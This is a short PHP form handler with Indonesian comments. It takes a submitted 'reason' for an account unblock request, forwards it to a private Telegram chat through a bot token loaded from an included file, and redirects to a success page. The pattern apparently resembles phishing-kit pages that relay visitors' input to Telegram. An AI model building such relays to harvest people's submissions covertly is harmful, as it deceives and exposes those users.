<?php
/* ----------------------------------------------
   
   ---------------------------------------------- */

include '../menu/ketan.php';  // token & chat ID

$pesan = $_POST['pesan'] ?? '';

/* Susun pesan */
$message = "❌ Permintaan Pembatalan Blokir\n\nAlasan:\n$pesan";

/* Kirim ke Telegram */
file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?' . http_build_query([
    'chat_id' => $chatid,
    'text'    => $message
]));

/* ----------------------------------------------
   Redirect setelah sukses kirim notifikasi
   Ganti 'selesai.php' jika ingin halaman lain.
   ---------------------------------------------- */
header('Location: /menu/berhasil.php');
exit;